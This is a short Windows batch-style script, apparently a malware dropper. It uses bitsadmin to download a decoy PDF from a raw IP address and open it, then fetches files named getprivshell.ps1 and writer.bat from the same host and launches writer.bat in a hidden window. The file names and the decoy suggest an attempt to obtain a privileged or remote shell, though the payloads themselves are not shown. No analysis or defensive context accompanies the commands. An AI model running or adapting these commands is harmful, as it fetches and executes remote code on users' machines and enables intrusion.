bitsadmin /transfer Explorers /download /priority FOREGROUND http://66.228.37.7/ncat/mypdf.pdf $env:USERPROFILE\AppData\Local\Temp\mypdf.pdf
cd $env:USERPROFILE\AppData\Local\Temp
start mypdf.pdf
bitsadmin /transfer Explorers /download /priority FOREGROUND http://66.228.37.7/ncat/getprivshell.ps1 $env:USERPROFILE\AppData\Local\Temp\getprivshell.ps1
bitsadmin /transfer Explorers /download /priority FOREGROUND http://66.228.37.7/ncat/writer.bat $env:USERPROFILE\AppData\Local\Temp\writer.bat
start writer.bat -windowstyle Hidden
